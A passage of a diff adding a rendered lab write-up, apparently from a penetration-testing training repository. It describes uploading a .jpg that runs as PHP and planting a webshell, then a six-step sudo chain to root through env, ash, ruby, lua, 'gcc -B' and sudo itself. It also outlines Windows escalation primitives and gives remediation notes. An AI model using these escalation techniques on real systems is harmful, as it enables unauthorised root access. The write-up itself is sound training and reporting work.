+refused for <code>.php</code> and accepted for <code>.jpg</code>; the <em>content</em> is never inspected, and it does not need
+to be. <strong>Rationale for doing this first:</strong> the lab is named for the escalation, so the escalation
+is the deliverable, and <code>id</code> at floor 0 is what tells you which ladder you are standing on.
+Measured: <code>uid=33(www-data)</code>.</li>
+<li><strong><code>www-data → daphne</code> via <code>env</code>.</strong> <code>sudo -n -u daphne /usr/bin/env id</code>. <strong>Rationale:</strong> the grant
+is read from <code>sudo -n -l</code> <em>as <code>www-data</code></em>, which lists exactly one program. There is no reason to
+enumerate anything else: one grant, one hop.</li>
+<li><strong><code>daphne → vilma</code> via <code>ash</code>.</strong> <code>ash</code> is a symlink to <code>dash</code> (<code>readlink -f</code> confirms), and it takes
+a script path, so the command is a file path and needs no quoting. <strong>Rationale:</strong> from here on
+every floor is &quot;write a script, run it through the granted interpreter&quot;, so I wrote one launcher
+per floor (<code>/tmp/f2.sh</code>, <code>/tmp/f3.rb</code>, <code>/tmp/f4.lua</code>) and only ever passed file paths through
+<code>sudo</code>. That removed an entire class of quoting failures from the middle of the chain.</li>
+<li><strong><code>vilma → shaggy</code> via <code>ruby</code>.</strong> <code>ruby /tmp/f3.rb</code>. <code>ruby</code> is a symlink to <code>ruby3.1</code>.</li>
+<li><strong><code>shaggy → fred</code> via <code>lua</code>.</strong> <code>lua /tmp/f4.lua</code>. <code>/usr/bin/lua</code> is an
+<code>/etc/alternatives/lua-interpreter</code> symlink. <strong>Rationale for scripting rather than <code>-e</code>:</strong> quoting
+a Ruby one-liner that embeds a Lua one-liner that embeds a <code>sudo</code> is a solved problem, and I lost
+time to it (§8.1) before giving up on it.</li>
+<li><strong><code>fred → scooby</code> via <code>gcc -B</code>.</strong> See F4. <strong>Rationale:</strong> this is the one floor that is not &quot;run my
+script&quot;, and it is the only floor that required a new idea. Before trying <code>-B</code> I checked the
+obvious alternative and rejected it on paper: compile a program and run it. That does <strong>not</strong>
+escalate — the compiled binary runs as <code>fred</code>, whoever executes it. Only a program <code>gcc</code>
+<em>itself</em> execve's runs as <code>scooby</code>.</li>
+<li><strong><code>scooby → root</code> via <code>sudo</code>.</strong> <code>sudo -n -u root /usr/bin/sudo id</code> → <code>uid=0(root)</code>. <strong>Rationale:</strong>
+this rule is self-referential. <code>sudo</code> execs its argv, so a grant to run <code>/usr/bin/sudo</code> as <code>root</code>
+is a grant to run anything at all as <code>root</code>. The link is not &quot;I got sudoers&quot;, it is &quot;the
+interpreter on this floor is <code>sudo</code> itself&quot;.</li>
+</ol>
+<p><strong>Why six hops and not fewer.</strong> Each account carries exactly one <code>NOPASSWD</code> rule, and none of them is
+<code>ALL</code>. <code>sudo -n -l</code> as <code>www-data</code> returns one line; the same is true of every other rung; no account
+is in <code>%sudo</code>; and every password in <code>/etc/shadow</code> is <code>*</code> or <code>!</code>, so there is no credential to
+shorten the walk. The floor count is a <strong>property of the policy</strong>, read off the target, not a plan —
+the same rule as <code>decision-making.md</code> §8, where a predicted three-hop chain turned out to be two.</p>
+<p><strong>admin vs. SYSTEM.</strong> Not applicable here, and I say so explicitly rather than leaving it implied:
+there is no Windows token, no integrity level and no group membership in this chain. The nearest
+analogue is F3's last rung, and it is worth separating there too: <code>scooby</code> is <em>not</em> privileged, and
+<code>scooby → root</code> is a real boundary crossing with its own severity. Conflating &quot;I am one rung from
+root&quot; with &quot;I am root&quot; would be a reporting error here exactly as it would be on Windows.</p>
+<hr />
+<h2 id="6-unused-findings">6. Unused findings</h2>
+<p>Load-bearing things not used in the chain, each with its own impact.</p>
+<ul>
+<li><strong><code>.ht.router.php</code></strong> — the Drupal router for PHP's <em>built-in</em> development server. It hard-fails
+outside <code>cli-server</code> (<code>if (PHP_SAPI !== 'cli-server') { … 403 }</code>), so it is dead weight in an Apache
+deployment. <strong>Information disclosure in principle, a curiosity in fact:</strong> it confirms the docroot
+was a Drupal tree. Not used.</li>
+<li><strong>The Drupal <code>.htaccess</code> at the document root</strong> — a 6 KB unmodified stock file protecting
+<code>.module</code>/<code>.engine</code>/<code>.tpl</code>/<code>.sql</code> files, <code>FilesMatch</code>-ing backup suffixes, and denying dotfiles.
+Its denials are real (§4) but <strong>no Drupal code exists to protect</strong>. An auditor can be misled into
+rating the docroot well-hardened on the strength of 6 KB of configuration for software that was
+deleted. That mismatch is the finding.</li>
+<li><strong><code>Option +ExecCGI</code> on the upload directory</strong> — reachable in principle; not exercised. Uploading a
+CGI script would need a shebang and a marked-executable file, and the upload path forces <code>.jpg</code>.
+Listed as untested, not as absent.</li>
+<li><strong><code>AddHandler php-script .php .jpg.php</code> in the vhost</strong> — inert for the attack, and inert in a way
+worth flagging: it tells a reader a double extension is needed, which is false. Two of the three
+candidate directives in this image are misleading, in opposite directions (§3 F1).</li>
+<li><strong><code>/var/www/html/.important/</code></strong> — an empty directory, <code>drwxr-xr-x www-data www-data</code>, sitting in the
+document root with a name that advertises importance. Nothing in it, and nothing writes to it. Not
+used; listed because a reader who inventories directories will meet it and a name that asserts a
+property is a §7 signal, not a finding.</li>
+<li><strong><code>/var/lib/php/sessions</code>, mode <code>0777</code></strong> — the only world-writable directory outside <code>/tmp</code>,
+<code>/var/tmp</code> and <code>/run/lock</code>. No application in this image uses sessions, so it is latent: with any
+session-using application it is a session-file-planting primitive. Not used.</li>
+<li><strong>MariaDB is installed, initialised and not running.</strong> <code>/var/lib/mysql</code> is populated, the client
+is present, and <code>/root/.mysql_history</code> shows databases <code>wordpress</code> and <code>drupal</code> being created and
+dropped. <strong>No <code>mysqld</code> process and no listening socket</strong>, so the whole database surface is dead. A
+reader who sees <code>mysql</code> in <code>/etc/passwd</code> and a populated data directory will reasonably assume a
+database to attack; the check that settles it is <code>ps</code> + <code>ss</code>, not the file tree.</li>
+<li><strong><code>mysqld</code>'s SUID helper</strong> <code>/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool</code> — present in
+every MariaDB install. Not probed; no database to authenticate to.</li>
+</ul>
+<hr />
+<h2 id="7-self-correction--prominent-because-it-cost-the-most">7. Self-correction — prominent, because it cost the most</h2>
+<p>Four defects in my own instrumentation. None was a defect in the target.</p>
+<p><strong>7.1 A nonce exported in the environment does not survive a <code>sudo</code> hop, and <code>shell_exec</code> returns
+only stdout, so a failed hop and a silent hop looked identical.</strong> I carried the witness as
+<code>export N=…</code> and read it back with <code>os.getenv(&quot;N&quot;)</code> inside the Lua floor. It came back <strong>nil</strong>,
+Lua aborted on <code>attempt to concatenate a nil value</code>, and the traceback went to <strong>stderr</strong> — which
+<code>shell_exec()</code> does not capture. So from the outside the whole middle of the chain printed nothing,
+and &quot;the hop failed&quot; and &quot;the hop produced no stdout&quot; produced the same observable. The cause is a
+real property of the target, not a bug in my script: <code>/etc/sudoers</code> sets <code>Defaults env_reset</code>, which
+strips the environment at every hop. <strong>Fix: put the nonce in the file contents, where sudo cannot
+reach it, and merge stderr into stdout at every level.</strong> This is <code>decision-making.md</code>'s &quot;the witness
+must be created in this run by the identity under test&quot; and &quot;a control that cannot fail&quot; pointed at
+my own harness — and note the sharper version: a witness carried in the <em>environment</em> is a witness
+the target is entitled to destroy.</p>
+<p><strong>7.2 A sticky <code>/tmp</code> file from the previous identity blocked the write, the write failed silently,
+and I ran the previous run's script.</strong> My &quot;clean&quot; consolidated transcript recreated
+<code>/tmp/h5/as</code>. An earlier run had left that file <strong>owned by <code>fred</code>, mode <code>0755</code></strong>, and <code>cat &gt;</code> on an
+existing file truncates <strong>in place</strong> — it needs write permission on the file, not on the directory.
+<code>www-data</code> had neither, so the redirect failed:</p>
+<pre><code>/tmp/final.sh: 9: cannot create /tmp/h5/as: Permission denied
+chmod: changing permissions of '/tmp/h5/as': Operation not permitted
+</code></pre>
+<p>and the script <strong>continued</strong>, using <code>fred</code>'s older copy — which is why my &quot;final&quot; transcript's floor 6
+printed a reward search from a script I had written two runs earlier instead of the <code>id</code> I had just
+written. I only noticed because the output was for a task I had not asked for in that run. <code>rm -f</code>
+first, or a fresh unique directory per run, is the fix. This is the <strong>exact</strong> case already written
+up at <code>decision-making.md:56</code> — a sticky file the new principal cannot overwrite, returning a
+well-formed answer <strong>one run behind the truth</strong> — and it cost me a full cycle again.</p>
+<p><strong>7.3 I read <code>drwxrwxr-x</code> as writable.</strong> Rewriting <code>themes/uploads/.htaccess</code> as <code>www-data</code> silently
+did nothing, and my first control test in §3 appeared to &quot;prove&quot; the file was writable. The file is
+<code>root:root 0644</code>; what I <em>could</em> do, and later did, is <code>unlink</code> it — the <strong>directory</strong> is
+<code>www-data</code>-owned, so remove-and-recreate works where in-place rewrite does not. <strong>The lesson is not
+&quot;remember to unlink&quot;, it is that &quot;the write silently did nothing&quot; and &quot;the write succeeded&quot; were the
+same observable</strong> because the shell reported neither. I had to <code>cat</code> the file to tell. The fix is to
+read the artefact back after writing it, every time, instead of trusting the exit status of a
+redirect.</p>
+<p><strong>7.4 A <code>printf %s</code> with <code>\n</code> in the argument wrote literal backslash-n, so my first &quot;blanket deny&quot;
+control was syntactically nonsense.</strong> <code>printf %s &quot;&lt;FilesMatch \&quot;.*\&quot;&gt;\n  Require all denied\n&lt;/FilesMatch&gt;&quot;</code>
+does not interpret escapes in the <em>argument</em> when the format string is <code>%s</code>. The file I served as a
+control contained the characters <code>\</code> and <code>n</code>, and I would have drawn a conclusion about <code>Require all denied</code> from a file that Apache could not parse. I caught it by <code>cat</code>-ing the control I had just
+written — which is 7.3's fix, applied a second time, one step earlier. <strong>A control must be read back
+before it is trusted, and so must a payload.</strong></p>
+<hr />
+<h2 id="8-not-tested-vs-discarded-and-the-design-observation">8. Not tested vs discarded, and the design observation</h2>
+<h3 id="not-tested-coverage-gap-declared">Not tested (coverage gap, declared)</h3>
+<ul>
+<li><strong>UDP.</strong> <code>nmap -sU</code> needs root and is unavailable on this host. No UDP coverage exists in this
+engagement. Per <code>decision-making.md</code> this is a gap, not a closed port.</li>
+<li><strong><code>Option +ExecCGI</code></strong> on the upload directory. Reachable, not exercised.</li>
+<li><strong>All five accounts' home directories.</strong> <code>/home</code> is empty and <code>[lab-home]/daphne</code> et al. do not exist,
+although <code>daphne</code> has <code>[lab-home]/daphne</code> as its home in <code>/etc/passwd</code>. <strong>Broken home directories for
+every ladder account</strong>: a login attempt would fail before a password prompt, so a <code>su</code> attempt is
+a dead end. I did not test a <code>su</code> hop per account.</li>
+<li><strong>The MariaDB surface</strong> beyond establishing that <code>mysqld</code> is not running. No socket, no process, so
+there is nothing to authenticate to.</li>
+<li><strong><code>LD_PRELOAD</code> injection through a <code>sudo</code> grant.</strong> <code>env_reset</code> is set and no <code>SETENV</code> appears in
+<code>sudoers</code>, which closes it by configuration. I state that from the configuration; I did not fire it.</li>
+</ul>
+<h3 id="discarded-with-reasons">Discarded, with reasons</h3>
+<ul>
+<li><strong>Compile a program with <code>gcc</code> and run it.</strong> Runs as <code>fred</code>, not <code>scooby</code> — discarded on the
+privilege model, before any attempt. See F4.</li>
+<li><strong>Chaining a single <code>sudo</code> invocation across floors</strong> (<code>sudo -u daphne env sudo -u vilma …</code>).
+Refused by the same policy from a different angle: the inner <code>sudo</code> is not on <code>daphne</code>'s grant
+list, so it prompts. Each hop is a separate <code>sudo</code> from a separate identity; there is no shortcut
+through one process.</li>
+<li><strong>Guessing a password for any account.</strong> Every hash field in <code>/etc/shadow</code> is <code>*</code> or <code>!</code>. There is
+no password to guess, so this is a <em>derived</em> discard, not an untried one.</li>
+<li><strong>Abusing <code>AddHandler php-script .php .jpg.php</code> to get a double extension.</strong> Unnecessary: plain
+<code>.jpg</code> already executes, because the operative directive is the global <code>AddType</code> (F1). Also
+impossible via the upload endpoint, which forces the stored name to end in <code>.jpg</code>.</li>
+<li><strong>Any Windows technique.</strong> There is no Windows host. Every Windows-specific tool on the checklist
+would have been inapplicable, and §9 explains why that does not make the Windows question moot.</li>
+</ul>
+<h3 id="design-observation--the-lab">Design observation — the lab</h3>
+<p><strong>This is the best-constructed lab of the ten, and it is undermined by its own naming.</strong> The
+mechanism is excellent: a ladder where <em>each rung names a different program</em>, so the player cannot
+memorise one trick and must re-derive &quot;this program is a capability&quot; six times. Floor 5 in
+particular — a compiler driver rather than an interpreter, escalating through subprogram resolution
+instead of argument injection — is the kind of step that teaches something. The Scooby-Doo framing
+(<code>daphne</code>, <code>velma</code>, <code>shaggy</code>, <code>fred</code>, <code>scooby</code>) is not decoration; it makes the ladder legible, and
+&quot;the mystery of the haunted elevator&quot; is a fair name for it once you are inside.</p>
+<p>The problems are all in the <em>decoys</em>, and they are the same decoy twice:</p>
+<ol>
+<li>The catalog promises Windows and ships Debian. Tenth time.</li>
+<li>The image carries <strong>three</strong> plausible mechanisms for the one behaviour that starts the lab, and
+<strong>two of them are inert</strong> — a vhost <code>AddHandler</code> that implies a double extension you do not need,
+and a root-owned <code>.htaccess</code> in the upload directory that would be the obvious place to look and
+that <code>AllowOverride None</code> has disabled. Worse, <code>apache2.conf:54</code> points an <code>AllowOverride All</code>
+block at <code>/var/www/html/uploads</code>, <strong>a path that does not exist</strong>, while the real one is
+<code>/var/www/html/themes/uploads</code>.</li>
+</ol>
+<p>Per <code>decision-making.md</code> §7 that second point is the serious one. A lab that ships an inert
+mitigation teaches the reader that reading a config file is verification. Here, the fragment that
+<em>names the exact behaviour</em> (<code>SetHandler … \.jpg$</code>, root-owned, therefore serious-looking) is the
+one that does nothing, and the fragment that <em>actually decides the outcome</em> is one unindented line
+in the main config with no comment. A differential write test settles it in two minutes; reading the
+files and picking the plausible one does not. The learner's takeaway should be the differential, and
+the lab as shipped rewards the guess instead.</p>
+<p>The minor versioning note, in the same spirit: <code>/var/www/html/index.html</code> is dated <code>2024-11-29</code>
+while <code>apache2.conf</code> is <code>2024-12-01</code> and the whole Drupal skeleton is <code>Nov 28 2024</code>, so the global
+<code>AddType</code> was added <strong>after</strong> the site content was written. The misconfiguration is a later edit,
+not an inherited default.</p>
+<hr />
+<h2 id="9-windows-privilege-escalation--the-decision-criterion">9. Windows privilege escalation — the decision criterion</h2>
+<p><strong>Provenance, stated first because it is load-bearing: this engagement produced no Windows target.</strong>
+The catalogue promises Windows, <code>docker inspect</code> reports <code>linux/amd64</code>, <code>/etc/os-release</code> says
+Debian 12, and <code>nmap</code> reports Apache on Linux. Everything below is therefore a <strong>criterion</strong>, not a
+verified result, and I am labelling it as such rather than dressing up a Linux chain as a Windows
+one. <code>active_directory.md</code> was <strong>not</strong> touched: this is not an AD domain, has no domain controller,
+no SMB, no LDAP and no Kerberos, and inventing an AD section from a Linux sudoers ladder would be
+exactly the naming error the methodology spends ten engagements warning about.</p>
+<p>The transferable content is the <strong>decision</strong>, and it is smaller than the technique list.</p>
+<h3 id="the-one-question">The one question</h3>
+<blockquote>
+<p><strong>What does the granted program do with the parts of the command I control — and with the paths it
+resolves other programs through?</strong></p>
+</blockquote>
+<p>That is the whole criterion, and it is platform-neutral. In this lab:</p>
+<table>
+<thead>
+<tr>
+<th>Linux instance (measured)</th>
+<th>Windows instance (not exercised)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudoers</code> grants a <strong>program</strong> — <code>NOPASSWD: /usr/bin/ruby</code> with no argument list</td>
+<td>SCM grants a <strong>service configuration right</strong> — <code>SERVICE_CHANGE_CONFIG</code> / <code>SERVICE_ALL_ACCESS</code> on a service you can rewrite</td>
+</tr>
+<tr>
+<td>The program is a general-purpose interpreter, so the grant is arbitrary code as the target</td>
+<td>The service's <code>ImagePath</code> resolves a <strong>binary you can replace</strong>, or its directory is writable by a group you are in</td>
+</tr>
+<tr>
+<td><code>gcc -B</code> resolves its <code>as</code>/<code>cc1</code>/<code>ld</code> subprograms <strong>by name from a prefix I choose</strong></td>
+<td>A service loads a <strong>DLL by search order</strong>; <code>ImagePath</code> is unquoted so a space splits it (<code>C:\Program Files\…</code>)</td>
+</tr>
+<tr>
+<td><code>NOPASSWD: /usr/bin/sudo</code> granted to <code>scooby</code> is self-referential: <code>sudo</code> execs argv</td>
+<td><code>SeImpersonatePrivilege</code> + a SYSTEM process, or <code>SeDebugPrivilege</code> + a SYSTEM process</td>
+</tr>
+<tr>
+<td>Escalation = <code>uid=33 → 0</code>, measured with <code>id</code> at every rung</td>
+<td>Escalation = token change; measured with <code>whoami /all</code> and <code>net session</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The equivalence is the oracle.</strong> A privilege grant is a <em>code-execution grant</em> if and only if the
+named program can be made to run attacker-chosen code — by interpreting its argv (F3 floors 1–4, 6),
+by argument injection into its own parser (<code>dpkg --pre-invoke</code>), or by resolving a program out of a
+search path you control (F4, DLL search order, unquoted <code>ImagePath</code>). Three different mechanisms,
+one test. A reader who has internalised the test does not need the list of interpreters, and will
+handle the ones nobody wrote down.</p>
+<h3 id="what-the-criterion-does-not-license">What the criterion does <strong>not</strong> license</h3>
+<ul>
+<li><strong>Do not collapse &quot;I have admin&quot; into &quot;I have SYSTEM&quot;.</strong> They are different tokens, produced by
+different mechanisms, with different severities and different remediations. In this lab the
+distinction would have been concrete: <code>scooby</code> is not privileged, and <code>scooby → root</code> is a real
+boundary. A report that says &quot;escalated to root&quot; when it reached an admin token is wrong in the
+direction that inflates the finding, which is the direction that gets a report dismissed.</li>
+<li><strong>Do not report one grant as one finding when it is a chain.</strong> Six <code>NOPASSWD</code> rules, six CWEs'
+worth of decisions, six remediations. A reviewer shown &quot;sudoers misconfigured&quot; patches one line
+and the other five are still there — the same argument as <code>decision-making.md</code>'s control-plane vs.
+data-plane rule, applied to a ladder.</li>
+<li><strong>Do not report the elevation without measuring the identity.</strong> <code>id</code> on Linux, <code>whoami /all</code> on
+Windows, at <strong>every</strong> rung, and <code>whoami /groups</code> when the mechanism is a token. Ten engagements in,
+this is the rule that keeps producing the highest-value finding: on this host, <code>id</code> at floor 0 is
+what revealed that floor 0 was <code>www-data</code> and not root, which is the difference between a one-hop
+engagement and a six-hop one.</li>
+<li><strong>&quot;I read the grant and it looks narrow&quot; is not a control test.</strong> Probe a program that is <em>not</em>
+granted (<code>sudo -n -u daphne /bin/bash</code> → <code>a password is required</code>) and then one that is. The
+negative result is what turns &quot;sudo is scoped&quot; from a claim into a measurement.</li>
+</ul>
+<h3 id="where-it-belongs-in-this-repository">Where it belongs in this repository</h3>
+<p>The class is <strong>already present</strong> and I did not add it a second time: <code>infrastructure.md</code>'s
+Sudo-rule oracle (&quot;read the rule as a <em>capability grant</em>, not as a shell&quot;), the Sudo
+argument-injection oracle (<code>dpkg</code>), the <code>LD_PREload</code> entry on the Linux privilege-escalation
+checklist, and the <code>Services</code> → <em>Service escalate registry / Executable / Unquoted Service Path /
+Service Binary Path</em> entries under POST Exploitation. What this lab adds to that material is the
+<strong>floor-5 oracle</strong> (a granted <em>driver</em> whose search path is the attack surface) and the explicit
+mapping of the criterion onto the Windows service/ACL primitives — both integrated as prose in
+<code>infrastructure.md</code>, next to the existing sudo oracles, not as a new technique list.</p>
+<hr />
+<h2 id="10-rewards">10. Rewards</h2>
+<p><strong>There is none.</strong> No <code>FLAG{}</code> exists in this image, and I am reporting that as a measured absence
+rather than inventing a value.</p>
+<p>Searched as <code>uid=0(root)</code>, over the whole filesystem with <code>/proc</code> and <code>/sys</code> excluded:</p>
+<pre><code># grep -rIlE &quot;FLAG\{|flag\{|congratul|felicidad|reward|hasSuperAdmin&quot; / --exclude-dir=/proc --exclude-dir=/sys
+/tmp/rootinner.sh            &lt;- my own search script, matched its own pattern
+/usr/share/perl5/Image/ExifTool/QuickTime.pm:1050:    # ... for much reward, see ref)
+/usr/share/perl/5.36.0/Pod/Perldoc.pm:1304:    # &quot;Funk is its own reward&quot;
+/usr/share/ghostscript/10.00.0/Resource/Init/gs_agl.ps:2206:/ideographiccongratulationparen 16#3237
+</code></pre>
+<p>Four hits, none of them a reward: two comments in Perl libraries, a Ghostscript glyph name, and my
+own script. A name-based sweep finds only Debian's own packaging marker:</p>
+<pre><code># find / -xdev \( -iname '*flag*' -o -iname '*reward*' -o -iname '*secret*' \)
+/var/lib/mysql/debian-10.11.flag        &lt;- debconf's mysql-server flag file, Debian packaging
+</code></pre>
+<p><code>grep -rIl</code> returns <strong>filenames</strong>, which is the right instrument here — a filesystem that does not
+contain the string cannot return it, and a <em>name</em> sweep catches a reward stored in a file whose
+content is not a flag. I also looked where a reward would be planted and it is empty:
+<code>/var/www/html/.important/</code> (empty), <code>/root/</code> (no <code>.bash_history</code> — it is a symlink to
+<code>/dev/null</code>, which is itself a small anti-forensic touch), <code>/opt</code>, <code>/srv</code>, <code>/var/backups</code> (all
+empty).</p>
+<p><strong>The reward for this lab is the escalation itself</strong>, and it is complete: <code>uid=33(www-data)</code> to
+<code>uid=0(root)</code> across six independent privilege boundaries, each one a separate misconfiguration with
+its own remediation. Per <code>decision-making.md</code>, an absence of reward is a deliverable and must be
+derived rather than asserted — this is the derivation.</p>
+<hr />
+<h2 id="11-restoration">11. Restoration</h2>
+<p>Everything I wrote lives in the container's <strong>writable layer</strong>; the image is untouched. Files created
+inside the container:</p>
+<pre><code>/var/www/html/s.php                       the stable webshell (F6)
+/var/www/html/probe.jpg                   docroot copy, used to prove the .jpg mapping is global
+/var/www/html/themes/uploads/*.jpg        four probe uploads
+/var/www/html/themes/uploads/t.jpg.php    vhost AddHandler probe
+/tmp/*.sh /tmp/*.rb /tmp/*.lua            the per-floor launchers
+/tmp/h5/ /tmp/elev2/                      the -B subprogram directories
+/var/www/html/themes/uploads/.htaccess    the file I overwrote and then deleted (F1 control test)
+</code></pre>
+<p>The one item that is not simply &quot;delete it&quot; is
+<code>/var/www/html/themes/uploads/.htaccess</code>: it shipped as <code>root:root 0644</code> and I replaced it with a
+blanket-deny control before removing it. <strong>It is not restored</strong>, because the correction is to remove
+<code>AddType application/x-httpd-php .jpg</code> from <code>apache2.conf</code> (F1 remediation) rather than to rely on
+an override that <code>AllowOverride None</code> had already disabled. The definitive restoration is therefore
+to destroy the container, which discards the writable layer entirely:</p>
+<pre><code class="language-bash">docker rm -f elevator_container
+docker rmi elevator:latest
+</code></pre>
+<p>which returns the host to its shipped state, since the state does not live in the image layer.
+<code>md5sum</code> verification of the image is unnecessary for the same reason — the tar in
+<code>labs/146/elevator.tar</code> is byte-identical to what was distributed, and the running container was the
+only thing modified.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
